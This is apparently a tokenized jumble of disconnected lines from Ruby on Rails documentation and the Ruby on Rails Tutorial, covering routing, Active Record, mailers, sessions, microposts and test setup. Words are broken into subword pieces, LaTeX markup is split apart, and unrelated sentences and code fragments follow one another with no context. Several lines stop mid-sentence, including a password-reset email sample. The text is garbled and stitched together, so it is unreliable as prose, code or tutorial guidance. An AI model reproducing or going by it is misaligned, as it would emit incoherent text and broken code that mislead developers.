▁* ▁` config ▖ action _ mailer ▖ default _ options ` ▁configure s ▁Action ▁Mailer ▁defaults ▖
▁ Only ▁logging ▁out ▁if ▁logged ▁in ▖
▁produce s ▁a ▁URL ▁of ▁the ▁form
▁in ▁Listing ~\ ref { code : hello _ action _ redux } ▁and
▁has _ secure _ password
▁as ▁show n ▁in ▁Listing ~\ ref { code : installing _ rails } .
▁On ▁the ▁other ▁hand , ▁for ▁the ▁sample ▁application ▁we ' ll ▁also ▁need ▁two ▁gems ▁we ▁did n ' t ▁need ▁before : ▁the ▁gem ▁for ▁RSpec ▁and ▁the ▁gem ▁for ▁the ▁RSpec ▁library ▁specific ▁to ▁Rails .
▁( This ▁practice ▁of ▁evaluat ing ▁\ text tt {||} ▁expression s ▁from ▁left ▁to ▁right ▁and ▁stop p ing ▁on ▁the ▁first ▁true ▁value ▁is ▁known ▁as ▁\ emph { sh or t - c irc u it ▁evaluat ion } .
▁ Migration s ▁allow ▁us ▁to ▁modify ▁our ▁application ' s ▁data ▁model .
▁We ' ll ▁write ▁simple ▁tests ▁for ▁each ▁of ▁the ▁title s ▁in ▁Table ~\ ref { table : static _ pages } ▁by ▁ com bin ing ▁the ▁tests ▁in ▁Listing ~\ ref { code : about _ test } ▁with ▁the ▁\ k ode { assert \_ select } ▁method , ▁which ▁let s ▁us ▁test ▁for ▁the ▁presence ▁of ▁a ▁particular ▁HTML ▁tag ▁( some times ▁called ▁a ▁`` select or '' , ▁hence ▁the ▁name )
▁By ▁default ▁` to _ param ` ▁just ▁calls ▁` to _ s `:
▁| ▁GET ▁| ▁ / kategorien / : id / be ar be it en ▁| ▁categories # edit ▁| ▁edit _ category _ path (: id ) ▁|
▁For ▁example , ▁you ▁get ▁ r id ▁of ▁the ▁duplication ▁in :
▁A lthough ▁the ▁edit ▁and ▁update ▁actions ▁from ▁Section ~\ ref { sec : updating _ users } ▁are ▁function ally ▁complete , ▁they ▁ s uffer ▁from ▁a ▁ r id ic ul ous ▁security ▁f la w : ▁they ▁allow ▁any one ▁( even ▁non - logged - in ▁users ) ▁to ▁access ▁either ▁action , ▁and ▁any ▁logged - in ▁user ▁can ▁update ▁the ▁information ▁for ▁any ▁other ▁user .
▁### ▁` only `
▁When ▁done ▁right , ▁writing ▁tests ▁also ▁allows ▁us ▁to ▁develop ▁\ emph { fast er } ▁ de s p ite ▁ requiring ▁extra ▁code , ▁because ▁we ' ll ▁end ▁up ▁was ting ▁less ▁time ▁try ing ▁to ▁ track ▁down ▁bug s .
▁In ▁practice ▁this ▁m ight ▁not ▁be ▁necessary , ▁and ▁in ▁fact ▁on ▁many ▁systems ▁the ▁fixtures ▁are ▁created ▁in ▁order .
▁By ▁ serv ing ╼ one ▁file ▁rather ▁than ▁many , ▁the ▁load ▁time ▁of ▁pages ▁can ▁be ▁great ly ▁reduce d ▁because ╼ the ▁browser ▁make s ▁few er ▁requests ▖
▁# ▁See ▁ https :// github ▖ com / s s te phens on / execjs # readme ▁for ▁more ▁supported ▁run times
▁< td > <%= ▁link _ to ▁' Edit ', ▁edit _ article _ path ( article ) ▁%></ td >
▁date ▁= ▁Date ▖ current ▁# ▁=> ▁Fri , ▁ 11 ▁Jun ▁2010
▁" F lo at " ▁=> ▁" float ",
▁ / publish ers /1/ magazine s / 2 / photos / 3
▁This ▁application ▁will ▁m o un t ▁the ▁engine ▁in ▁the ╼` test / dummy / config / routes ▖ rb ` ▁file :
▁#### ▁ Adding ▁A tt a ch ment s
▁On ▁some ▁systems , ▁you ▁may ▁need ▁to ▁restart ▁the ▁Rails ▁server ▁at ▁this ▁point ▁to ▁keep ▁the ▁test ▁suite ▁\ passing .
▁In ▁a ▁ deep ▁merge , ▁if ▁a ▁key ▁is ▁found ▁in ▁both ▁hashes ▁and ▁their ▁values ▁are ▁hashes ▁in ▁turn , ▁then ▁their ▁ _ merge _ ▁becomes ▁the ▁value ▁in ▁the ▁result ing ▁hash :
▁ Adding ▁30 ▁extra ▁users ▁to ▁the ▁fixture .
▁The ▁ core ▁of ▁the ▁micropost ▁data ▁model ▁is ▁even ▁simple r ▁than ▁the ▁one ▁for ▁users : ▁a ▁micropost ▁has ▁only ▁an ▁\ k ode { id } ▁and ▁a ▁\ k ode { content } ▁field ▁for ▁the ▁micropost ' s ▁text ▁( of ▁type ▁\ k ode { string })
▁A ▁list ▁of ▁gems ▁used ▁to ▁ensure ▁that ▁all ▁copie s ▁of ▁the ▁app ▁use ▁the ▁same ▁gem ▁versions
▁In ▁the ▁integration ▁test ▁from ▁Listing ~\ ref { code : layout _ links _ test }, ▁add ▁code ▁to ▁visit ▁the ▁signup ▁page ▁using ▁the ▁\ k ode { get } ▁method ▁and ▁verify ▁that ▁the ▁result ing ▁page ▁title ▁is ▁correct .
▁This ▁command , ▁when ▁run ▁for ▁the ▁first ▁time , ▁will ▁copy ▁over ▁all ▁the ▁migrations ╼ from ▁the ▁engine ▖
▁To ▁an ▁experience d ▁Rails ▁developer , ▁this ▁line ▁look s ▁simple , ▁but ▁there ▁are ▁at ▁least ▁four ▁ potentially ▁confusing ▁Ruby ▁idea s : ▁built - in ▁Rails ▁methods , ▁method ▁ invocation ▁with ▁missing ▁parentheses , ▁symbols , ▁and ▁hashes .
▁> > ▁Rails ▖ env
▁Note ▁that ▁we ' ve ▁included ▁an ▁optional ▁second ▁argument ▁to ▁the ▁ assert ion ▁with ▁a ▁custom ▁error ▁message , ▁which ▁in ▁this ▁case ▁identifie s ▁the ▁address ▁caus ing ▁the ▁test ▁to ▁fail :
▁# ▁Choos e ▁the ▁ compressor s ▁to ▁use ▁( if ▁any ) ▁config ▖ assets ▖ js _ compressor ▁=
▁def ▁bar
▁Active ▁Record ▁Associations
▁As ▁a ▁b on us , ▁by ▁using ▁base 64 ▁strings ▁specifically ▁design ed ▁to ▁be ▁ safe ▁in ▁URLs ▁( as ▁indicate d ▁by ▁the ▁name ▁\ k ode { url safe \_ base 64 }), ▁we ' ll ▁be ▁able ▁to ▁use ▁the ▁same ▁token ▁generator ▁to ▁make ▁account ▁activation ▁and ▁password ▁reset ▁links ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } .
▁To ▁avoid ▁this ▁in compatibility , ▁we ' ll ▁standard ize ▁on ▁all ▁lower - case ▁addresses , ▁convert ing ▁`` Foo @ E x A M P le ▖ Co M '' ▁to ▁`` foo @ example ▖ com '' ▁before ▁\ line break ▁saving ▁it ▁to ▁the ▁database .
▁P erhaps ▁the ▁most ▁d ra ma tic ▁example ▁is ▁the ▁merge r ▁of ▁Rails ▁and ▁M erb , ▁a ▁ ri val ▁Ruby ▁web ▁framework , ▁so ▁that ▁Rails ▁now ▁benefit s ▁from ▁M erb ' s ▁ mod ul ar ▁design , ▁ s table ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Application _ programming _ interface } { API }, ▁and ▁improve d ▁perform ance .
▁c ▁= ▁ Customer ▖ first
▁In ▁order ▁to ▁use ▁a ▁different ▁file , ▁call ▁` layout ` ▁in ▁your ▁mailer :
▁This ▁declaration ▁needs ▁to ▁be ▁back ed ▁up ▁by ▁the ▁proper ▁foreign ▁key ▁declaration ▁on ▁the ▁orders ▁table :
▁# ▁P ar en the s es ▁on ▁function ▁calls ▁are ▁optional .
▁The ▁\ k ode { before } ▁block ▁save s ▁the ▁user ▁to ▁the ▁database ▁so ▁that ▁it ▁can ▁be ▁retrieved ▁using ▁\ k ode { find \_ by }, ▁which ▁we ▁accomplish ▁using ▁the ▁\ k ode { let } ▁method :
▁Client ▖ pluck (: name )▖ limit (1)
▁For ▁example , ▁we ▁could ▁make ▁a ▁ persistent ▁session ▁by ▁creating ▁a ▁cookie ▁with ▁value ▁equal ▁to ▁the ▁remember ▁token ▁that ▁ expire s ▁20 ~ years ▁from ▁now :
▁As ▁part ▁of ▁ installing ▁Ruby , ▁if ▁you ▁are ▁using ▁OS ~ X ▁or ▁ Linux ▁I ▁ strong ly ▁recommend ▁using ▁\ href { http :// rvm ▖ io /}{ Ruby ▁ Version ▁Manager ▁( RVM )} ▁or ▁\ href { https :// github ▖ com / s s te phens on / rb env } { rb env }, ▁which ▁allow ▁you ▁to ▁install ▁and ▁manage ▁multiple ▁versions ▁of ▁Ruby ▁on ▁the ▁same ▁machine .
▁Noti ce ▁here ▁how ▁c l ever ▁\ k ode { paginate } ▁is --- it ▁even ▁works ▁\ emph { through } ▁the ▁microposts ▁association , ▁reach ing ▁into ▁the ▁\ text tt { microposts } ▁table ▁and ▁pull ing ▁out ▁the ▁desired ▁page ▁of ▁microposts .
▁resources ▁: photos ▁do
▁Run ▁Command - S h if t - E ▁to ▁run ▁the ▁same ▁test / group ▁again , ▁verify ing ▁that ▁it ' s ▁green .
▁Thu s , ▁you ▁should ▁always ▁use ▁the ▁" _ url " ▁variant ▁of ▁named ▁route ╼ helpers .
▁| ▁GET ▁| ▁ / comments / : id / edit (▖ : format ) ▁| ▁comments # edit ▁| ▁edit _ sekret _ comment _ path ▁|
▁( We ▁saw ▁how ▁symbols ▁are ▁ interpolate d ▁as ▁strings ▁in ▁Section ~\ ref { sec : the _ flash } ▖)
▁ Base ▁title
▁It ▁is ▁ tr us ted , ▁no ▁matter ▁whether ▁it ▁has ▁been ▁escape d ▁or ▁not .
▁S ince ▁Rails ▁doesn ' t ▁restrict ▁the ▁symbols ▁that ▁you ▁use ▁to ▁set ▁I 18 n ▖ locale , ▁you ▁can ▁ le verage ▁this ▁system ▁to ▁display ▁different ▁content ▁depending ▁on ▁anything ▁you ▁like ▖
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : action _ tests _ admin }
▁=> ▁[ 42, ▁ 8, ▁17 , ▁6 ]
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁= ▁10
▁#### ▁` Date ▖ current `
▁You ▁can ▁choose ▁from ▁a ▁set ▁of ▁built ▁in ╼ options ▁or ▁specify ▁your ▁own .
▁Rails ▁has ▁a ▁hand y ▁rake ▁task ▁for ▁ inspect ing ▁the ▁middleware ▁ stack ▁in ▁use :
▁Instead , ▁you ' ll ▁see ▁something ▁that ▁look s ▁like ▁the ▁following :
▁In ▁this ▁section ▁we ' ll ▁handle ▁ unsuccessful ▁edit s , ▁following ▁similar ▁idea s ▁to ▁ unsuccessful ▁signup s ▁( Section ~\ ref { sec : unsuccessful _ signup s }) .
▁item ▁= ▁It em ▖ first
▁the ▁SQL ▁executed ▁would ▁be :
▁@ order _ count ▁= ▁@ customer ▖ orders ▖ size
▁Testing ▁for ▁ reverse ▁relationships .
▁With ▁this ▁sub st it u tion , ▁the ▁correct ed ▁application ▁code ▁appears ▁as ▁in ▁Listing ~\ ref { code : correct _ login _ failure } .
▁ From ▁the ▁beginning , ▁Rails ▁has ▁benefit ed ▁from ▁a ▁p al p able ▁sense ▁of ▁ ex c item ent , ▁starting ▁with ▁the ▁ fa m ous ▁\ href { http :// www ▖ y out ub e ▖ com / watch ? v = G z j 723 L k R J Y } { 15 - minute ▁we blog ▁ video } ▁by ▁Rails ▁ creator ▁ David ▁H einemeier ▁Hansson .
▁\ text tt { GET }, ▁e t ▁ ce t .
▁t ▖ belongs _ to ▁: account
▁validates ▁: email , ▁uniqueness : ▁true
▁ ╼ - --- == _ mime part _5407 babbe 3 50 5 _ 87 22 b 2 57 d 045617 ╼ Content - Type : ▁text / html ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼╼ < h 1> Password ▁reset </ h 1 >╼╼< p > To ▁reset ▁your ▁password ▁click ▁the ▁link ▁below : </ p >╼╼< a ▁ href =" http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / ╼ password _ resets / 3 B d B r X e Q Z S W q F ID R N 8 c x HA / ╼ edit ?
▁| ▁| ▁30 1 ▁| ▁: mov ed _ permanent ly ▁|
▁More over , ▁by ▁consider ing ▁\ emph { reverse } ▁relationships , ▁we ▁could ▁use ▁the ▁\ k ode { follower \_ id } ▁column ▁to ▁ extract ▁an ▁array ▁of ▁user ' s ▁followers .
▁In ▁the ▁unlike ly ▁even t ▁that ▁find ing ▁the ▁count ▁is ▁ still ▁a ▁ bo tt le n ec k ▁in ▁your ▁application , ▁you ▁can ▁make ▁it ▁even ▁faster ▁with ▁a ▁\ href { http :// r ailscasts ▖ com / episodes / 23 - counter - cache - column }{\ emph { counter ▁cache } } .
▁C on str a in ing ▁microposts ▁to ▁be ▁at ▁most ▁ 140 ▁characters .
▁The ▁generated ▁migration ▁for ▁the ▁remember ▁digest .
▁The ▁Relationship s ▁controller .
▁| README ▖ rdoc | This ▁is ▁a ▁brief ▁in str u c tion ▁ man u al ▁for ▁your ▁application ▖
▁I ' ve ▁done ▁my ▁best ▁to ▁cover ▁as ▁many ▁base s ▁as ▁possible , ▁but ▁systems ▁var y , ▁and ▁many ▁things ▁can ▁go ▁wrong ▁during ▁these ▁steps .
▁def ▁some _ method
▁ Options ▁passed ▁to ▁this ▁can ▁be ▁configured ▁by ▁using ▁` config ▖ ssl _ options ` .
▁Client ▖ order (" created _ at ")
▁More over , ▁we ▁would ▁have ▁to ▁remember ▁to ▁ r epeat ▁the ▁process ▁any ▁time ▁the ▁application ▁changed .
▁Instead , ▁you ▁provide ▁the ▁names ▁and ▁values ▁manually .
▁A lthough ▁the ▁sample ▁app ▁will ▁eventual ly ▁have ▁users , ▁microposts , ▁and ▁a ▁full ▁login ▁and ▁authentication ▁framework , ▁we ▁will ▁ begin ▁with ▁a ▁seem ing ly ▁ limited ▁topic : ▁the ▁creation ▁of ▁static ▁pages .
▁A part ▁from ▁proper ▁ ordering , ▁there ▁is ▁a ▁second ▁refinement ▁we ' d ▁like ▁to ▁add ▁to ▁microposts .
▁ Show ing ▁the ▁given ▁user ' s ▁followers .
▁in ▁Listing ~\ ref { code : micropost _ model } .
▁This ▁code ▁will ▁generate ▁SQL ▁like ▁this :
▁valid ▁user
▁This ▁choice ▁is ▁base d ▁on ▁the ▁\ href { http :// r ailscasts ▖ com / episodes / 27 4 - remember - me - reset - password } { RailsCast ▁on ▁remember ▁me } .
▁To ▁make ▁a ▁new ▁user , ▁we ▁visit ▁the ▁\ href { http ://0▖0▖0▖0:3000/ users / new }{\ text tt { new } } ▁page , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : demo _ new _ user _ rails _3} .
▁An ▁equivalent ▁form ul ation ▁of ▁Listing ~\ ref { code : validates _ presence _ of _ name } ▁using ▁parentheses ▁is ▁as ▁follows :
▁When ▁you ▁assign ▁an ▁object ▁to ▁a ▁` has _ and _ belongs _ to _ many ` ▁association , ▁that ▁object ▁is ▁automatically ▁saved ▁( in ▁order ▁to ▁update ▁the ▁join ▁table )▖
▁" Invoice "▖ tableize ▁# ▁=> ▁" invoices "
▁Rails ▁4▖0 ▁no ▁longer ▁supports ▁loading ▁plugin s ▁from ▁` vendor / plugin s ` ▖
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title ▖
▁We ' ll ▁fix ▁this ▁by ▁te mp or ar ily ▁comment ing ▁out ▁the ▁failing ▁lines , ▁as ▁show n ▁in ▁Listing ~\ ref { code : comment _ out _ failing _ tests } .
▁# ▁ label (: article , ▁: title , ▁" A ▁short ▁title ", ▁class : ▁" title _ label ")
▁The ▁` auto _ discover y _ link _ tag ` ▁helper ▁build s ▁HTML ▁that ▁most ▁browsers ▁and ▁feed ▁readers ▁can ▁use ▁to ▁ de t ec t ▁the ▁presence ▁of ▁ RSS ▁or ▁ Atom ▁feed s ▖
▁#### ▁Call ing ▁the ▁Mailer
▁ Adding ▁a ▁flash ▁message ▁to ▁user ▁signup .
▁-> ▁S eq ▁S can ▁on ▁articles ▁( cost = 0 ▖ 00 ▖ ▖ 28 ▖ 88 ▁rows = 8 ▁ width = 4 )
▁config ▖ generator s ▁do ▁| g |
▁Now ▁that ▁we ▁have ▁articles ▁and ▁comments ▁working , ▁take ▁a ▁look ▁at ▁the ╼` app / views / articles / show ▖ html ▖ erb ` ▁template ▖
▁You ▁should ▁verify ▁that ▁click ing ▁on ▁the ▁link ▁in ▁Figure ~\ ref { fig : demo _ destroy _ user } ▁destroy s ▁the ▁second ▁user , ▁yield ing ▁an ▁index ▁page ▁with ▁only ▁one ▁user .
▁ Adding ▁an ▁\ k ode {@ user } ▁variable ▁to ▁the ▁\ k ode { new } ▁action .
▁Fin ally , ▁a ▁call ▁to ╼` submit ` ▁on ▁the ▁` f ` ▁object ▁will ▁create ▁a ▁submit ▁button ▁for ▁the ▁form .
▁ INNER ▁JOIN ▁categories ▁ ON ▁articles ▖ category _ id ▁= ▁categories ▖ id
▁ invoices ▖ index _ by ( & : number )
▁ Updating ▁the ▁errors ▁for ▁edit ing ▁users .
▁When ▁using ▁a ▁custom ▁code r ▁( e ▖ g ▖ ▁` serialize ▁: meta data , ▁JSON ` ) ,╼ as signing ▁` nil ` ▁to ▁a ▁serializ ed ▁attribute ▁will ▁save ▁it ▁to ▁the ▁database ╼ as ▁` NULL ` ▁instead ▁of ▁passing ▁the ▁` nil ` ▁value ▁through ▁the ▁code r ▁( e ▖ g ▖ ▁` " null " `╼ when ▁using ▁the ▁` JSON ` ▁code r ) .
▁You ▁can ▁match ▁all ▁verb s ▁to ▁a ▁particular ▁route ▁using ▁` via : ▁: all `:
▁In ▁Chapter ~\ ref { cha : account _ activation }, ▁we ' ll ▁make ▁\ emph { sure } ▁of ▁email ▁ validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁( We ' ll ▁create ▁the ▁\ k ode { shared } ▁directory ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up } ▖)
▁### ▁A v a i l able ▁callbacks
▁Return s ▁the ▁ follower
▁If ▁the ▁files ▁and ▁directories ▁don ' t ▁appear ▁as ▁show n ▁in ▁Figure ~\ ref { fig : cloud 9 _ gemfile }, ▁click ▁on ▁the ▁file ▁ navigator ' s ▁ ge ar ▁ icon ▁and ▁select ▁`` Re f re sh ▁File ▁T re e '' .
▁In ▁addition , ▁for ▁many ▁purposes , ▁including ▁for ▁this ▁tutorial , ▁Heroku ' s ▁free ▁t i er ▁is ▁more ▁than ▁ sufficient .
▁The ▁order ▁of ▁the ▁parts ▁getting ▁inserted ▁is ▁determine d ▁by ▁the ▁`: part s _ order `╼ in side ▁of ▁the ▁` ActionMailer :: Base ▖ default ` ▁method .
▁The ▁` association = ` ▁method ▁ assigns ▁an ▁ associated ▁object ▁to ▁this ▁object ▖
▁item ▖ increment !( : views )
▁### ▁Controller ▁Name space s ▁and ▁ Routing
▁The ▁final ▁piece ▁of ▁the ▁relationships ▁p u z z le ▁is ▁to ▁add ▁a ▁\ k ode { user ▖ followers } ▁\ line break ▁method ▁to ▁go ▁with ▁\ k ode { user ▖ following } .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test }
▁The ▁server ▁log ▁error ▁for ▁ / users /1 .
▁When ▁you ' re ▁h app y ▁with ▁the ▁code ▁on ▁your ▁computer , ▁you ▁need ▁to ▁commit ▁the ▁changes ▁to ▁Git :
▁ Symbol s ▁are ▁a ▁special ▁Ruby ▁data ▁type ▁ shared ▁with ▁very ▁few ▁other ▁languages , ▁so ▁they ▁may ▁seem ▁we ir d ▁at ▁first , ▁but ▁Rails ▁uses ▁them ▁a ▁lot , ▁so ▁you ' ll ▁get ▁used ▁to ▁them ▁ fast .
▁Rails ▁engines , ▁however ▁are ▁scope d ▁to ▁run ▁in dependent ly ▁from ▁the ▁main ╼ application , ▁so ▁each ▁engine ▁get s ▁a ▁scope d ▁` Application Controller ` ▖
▁In ▁previous ▁versions ▁of ▁Rails , ▁all ▁assets ▁were ▁located ▁in ▁subdirectories ▁of ╼` public ` ▁such ▁as ▁` images `, ▁` javascripts ` ▁and ▁` stylesheets ` ▖
▁* ▁` config ▖ en coding ` ▁set s ▁up ▁the ▁application - wide ▁encoding ▖
▁Before ▁mov ing ▁on , ▁we ' ll ▁write ▁a ▁test ▁for ▁valid ▁submission ▁to ▁verify ▁our ▁application ' s ▁behavior ▁and ▁catch ▁re gr ess ion s .
▁* ▁`: validate `
▁A ▁ preview ▁of ▁the ▁text ▁version ▁of ▁the ▁password ▁reset ▁email .
▁* ▁` has _ one ▁: through `
▁class ▁Article sController ▁< ▁Application Controller
▁WARNING ▖ ▁Note ▁you ▁can ' t ▁ append ▁with ▁` atomic _ write ` .
▁The ▁\ k ode { form \_ for } ▁helper ▁is ▁used ▁to ▁make ▁forms ▁for ▁interact ing ▁with ▁Active ▁Record ▁objects .
▁# ▁=> ▁< input ▁id =" accept " ▁name =" accept " ▁type =" checkbox " ▁value = "1" ▁/>
▁We ▁see ▁that ▁a ▁string ▁of ▁spaces ▁is ▁not ▁\ emph { empty }, ▁but ▁it ▁is ▁\ emph { blank } .
▁The ▁extra ▁methods ▁appear ▁in ▁Listing ~\ ref { code : user _ activation _ methods }, ▁and ▁the ▁ refactored ▁application ▁code ▁appears ▁in ▁Listing ~\ ref { code : user _ signup _ refactored } ▁and ▁Listing ~\ ref { code : account _ activation _ refactored } .
▁M any ▁popular ▁U N I X - like ▁OS es ▁ ship ▁with ▁an ▁accept able ▁version ▁of ▁SQLite 3 ▖
▁This ▁way ▁the ▁code ▁has ▁a ▁more ▁ tr an s parent ▁meaning , ▁and ▁it ' s ▁also ▁more ▁flexible ▁since ▁we ▁can ▁change ▁the ▁definition ▁of ▁\ k ode { about \_ path } ▁and ▁have ▁the ▁URL ▁change ▁every where ▁\ k ode { about \_ path } ▁is ▁used .
▁M any ▁people ▁ er r one ous ly ▁believe ▁that ▁\ k ode { sudo } ▁stand s ▁for ▁`` super user ▁do '' ▁because ▁it ▁run s ▁commands ▁as ▁the ▁ super user ▁( root ) ▁by ▁default .
▁This ▁creates ▁the ▁\ k ode { static \_ pages \_ spec ▖ rb } ▁in ▁the ▁\ k ode { spec / request s } ▁directory .
▁With ▁the ▁code ▁as ▁show n ▁in ▁Listing ~\ ref { code : image _ uploader _ resizing }, ▁large ▁images ▁are ▁now ▁re size d ▁nicely ▁( Figure ~\ ref { fig : re size d _ image }) .
▁Your ▁words ▁made ▁sense , ▁but ▁your ▁ s ar c as tic ▁to ne ▁did ▁not .
▁" Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App ▁| ▁About "
▁A ▁table ▁of ▁the ▁routes ▁generated ▁by ▁Listing ~\ ref { code : following _ followers _ action s _ routes } ▁appears ▁in ▁Table ~\ ref { table : following _ routes } .
▁The ▁task s ▁are ▁respectively
▁### ▁Using ▁ Partial s
▁The ▁method ▁` except ` ▁returns ▁a ▁hash ▁with ▁the ▁keys ▁in ▁the ▁argument ▁list ▁removed , ▁if ▁present :
▁def ▁edit
▁Here ▁are ▁some ▁basic ▁examples :
▁ { a : ▁1, ▁b : ▁1 } ▖ merge ( a : ▁ 0, ▁c : ▁2 )
▁You ▁then ▁have ▁a ▁corresponding ╼` app / views / users / create ▖ js ▖ erb ` ▁view ▁file ▁that ▁generates ▁the ▁actual ▁JavaScript ╼ code ▁that ▁will ▁be ▁sent ▁and ▁executed ▁on ▁the ▁client ▁ side .
▁The ▁ demo ▁app ▁ developed ▁in ▁this ▁chapter ▁has ▁sever al ▁ strength s ▁and ▁a ▁host ▁of ▁we a k ness es .
▁For ▁example , ▁if ▁you ▁generate ▁a ▁` Project sController `, ▁Rails ▁will ▁also ▁add ▁a ▁new ╼ file ▁at ▁` app / assets / javascripts / projects ▖ js ▖ coffee ` ▁and ▁another ▁at ╼` app / assets / stylesheets / projects ▖ css ▖ scss ` ▖
▁Format s ▁a ▁number ▁with ▁the ▁specified ▁level ▁of ▁` precision `, ▁which ▁defaults ▁to ▁3 .
▁Rails ▁is ▁a ▁web ▁application ▁development ▁framework ▁written ▁in ▁the ▁Ruby ▁language .
▁ Each ▁instance ▁of ▁the ▁` Supplier ` ▁model ▁will ▁have ▁these ▁methods :
▁R at her ▁than ▁render ▁a ▁page ▁on ▁successful ▁user ▁creation , ▁we ' ll ▁instead ▁\ emph { redirect } ▁to ▁a ▁different ▁page .
▁If ▁you ▁have ▁made ▁a ▁mistake ▁in ▁this ▁are a , ▁the ▁most ▁common ▁ sy mp to m ▁is ▁a ▁b la c k ╼ d ia m on d ▁with ▁a ▁question ▁mark ▁inside ▁appear ing ▁in ▁the ▁browser ▖
▁This ▁is ▁the ▁middleware ▁which ▁supports ▁the ▁PATCH , ▁ PUT , ▁and ▁DELETE ▁HTTP ▁method ▁types .
▁The ▁result ▁is ▁show n ▁in ▁Listing ~\ ref { code : relationship _ belongs _ to } .
▁this ▁generates
▁Implement ▁it ▁and ▁click ▁on ▁a ▁pagination ▁link ▁to ▁see ▁why ▖)
▁Because ▁of ▁this ▁ danger , ▁it ▁is ▁essential ▁to ▁pass ▁parameters ▁that ▁have ▁been ▁processed ▁to ▁ permit ▁only ▁ safe - to - edit ▁attributes .
▁They ▁are ▁important , ▁though , ▁and ▁I ▁suggest ▁learning ▁about ▁them ▁using ▁one ▁of ▁the ▁Ruby ▁ books ▁recommended ▁in ▁Section ~\ ref { sec : guid e _ to _ f ur the r _ resources } .
▁# logo ▁ { ▁background : ▁url ( <%= ▁asset _ data _ ur i ▁' logo ▖ png ' ▁%> ) ▁ }
▁Application s ▁assets ▁such ▁as ▁c ascad ing ▁style ▁ sheet s ▁( CSS ), ▁JavaScript ▁files , ▁and ▁images
▁The ▁` blorgh ` ▁directory ╼ is ▁where ▁the ▁other ▁controllers ▁for ▁the ▁engine ▁will ▁go ▖
▁Having ▁handle d ▁a ▁failed ▁signin , ▁we ▁now ▁need ▁to ▁actually ▁sign ▁a ▁user ▁in .
▁from : ▁" no reply @ example ▖ com "
▁We ' ll ▁first ▁look ▁at ▁the ▁out er ▁structure , ▁which ▁consist s ▁of ▁ embedded ▁Ruby ▁open ing ▁with ▁a ▁call ▁to ▁\ k ode { form \_ for } ▁and ▁ closing ▁with ▁\ k ode { end } :
▁That ▁is ▁what ▁or dinarily ▁happens , ▁if ▁a ▁module ▁is ▁called ▁" M ", ▁the ▁` M ` ▁constant ▁exists ▁and ▁hold s ▁it :
▁You ▁can ▁also ▁create ▁a ▁layout ▁with ▁multiple ▁yield ing ▁re g ion s :
▁* ▁How ▁to ▁construct ▁your ▁own ▁routes , ▁using ▁either ▁the ▁preferred ▁resource ful ▁style ▁or ▁the ▁` match ` ▁method .
▁What ' s ▁going ▁on ?
▁The ▁only ▁thing ▁you ▁have ▁to ▁do ▁to ▁enable ▁ Turbolinks ▁is ▁have ▁it ▁in ▁your ▁Gemfile ,╼ and ▁put ▁` //= ▁require ▁ turbolinks ` ▁in ▁your ▁CoffeeScript ▁manifest , ▁which ▁is ▁usually ╼` app / assets / javascripts / application ▖ js ` .
▁Rails ▁determine s ▁the ▁name ▁of ▁the ▁partial ▁to ▁use ▁by ▁look ing ▁at ▁the ▁model ▁name ▁in ▁the ▁collection ▖
▁The ▁\ k ode { puts } ▁method ▁operat es ▁as ▁a ▁\ emph { side - e ffect } : ▁the ▁expression ▁\ k ode { puts ▁" foo "} ▁ print s ▁the ▁string ▁to ▁the ▁ screen ▁and ▁then ▁returns ▁\ href { http :// www ▖ answer s ▖ com / nil } { li ter ally ▁not h ing } : ▁\ k ode { nil } ▁is ▁a ▁special ▁Ruby ▁value ▁for ▁`` not h ing ▁at ▁all '' .
▁format ▖ html ▁ { ▁render ▁action : ▁" new " ▁ }
▁We ▁see ▁here ▁that ▁strings ▁respond ▁to ▁the ▁method ▁\ k ode { class }, ▁and ▁simply ▁return ▁the ▁class ▁they ▁be long ▁to .
▁create ▁app / helpers / users _ helper ▖ rb
▁╼╼ ▁\ subsection { The ▁asset ▁pipeline } ▁% ▁( fold )╼ ▁\ label { sec : the _ asset _ pipeline }╼╼ F
▁This ▁evaluate s ▁to ▁\ k ode { session [: return \_ to ]} ▁unless ▁it ' s ▁\ k ode { nil }, ▁in ▁which ▁case ▁it ▁evaluate s ▁to ▁the ▁given ▁default ▁URL .
▁Of ▁course , ▁to ▁create ▁enough ▁users ▁to ▁make ▁a ▁d ec ent ▁users ▁index , ▁we ▁\ emph { co ul d } ▁use ▁our ▁web ▁browser ▁to ▁visit ▁the ▁signup ▁page ▁and ▁make ▁the ▁new ▁users ▁one ▁by ▁one , ▁but ▁a ▁far ▁better ▁solution ▁is ▁to ▁use ▁Ruby ▁( and ▁Rake ) ▁to ▁make ▁the ▁users ▁for ▁us .
▁Because ▁the ▁user ▁isn ' t ▁valid , ▁an ▁attempt ▁to ▁save ▁the ▁user ▁to ▁the ▁database ▁automatically ▁fails :
▁A ▁live , ▁database - back ed ▁web ▁application ▁in ▁production
▁In ▁Rails ▁version ▁later ▁than ▁4▖0 , ▁this ▁code ▁raise s ▁an ▁error ▁( as ▁seen ▁in ▁Figure ~\ ref { fig : signup _ failure } ▁and ▁Figure ~\ ref { fig : signup _ failure _ rails _ debug } ▁above ), ▁which ▁means ▁it ▁is ▁secure ▁by ▁default .
▁In ▁other ▁words , ▁to ▁only ▁build ▁routes ▁with ▁the ▁minimal ▁amount ▁of ▁information ▁to ▁unique ly ▁identify ▁the ▁resource , ▁like ▁this :
▁Last - Mo d if i ed : ▁Thu , ▁ 08 ▁May ▁2014 ▁01 : 2 4 : 14 ▁GMT ╼ Content - Type : ▁text / css
▁store _ location
▁S ince ▁we ▁then ▁save ▁\ k ode {@ user }, ▁the ▁duplicate ▁user ▁has ▁an ▁email ▁address ▁that ▁already ▁exists ▁in ▁the ▁database , ▁and ▁hence ▁should ▁not ▁be ▁valid .
▁Co mp at ible ▁with ▁both ▁Ruby ' s ▁own ▁` Logger ` ▁and ▁` Log 4 r ` ▁ logger s .
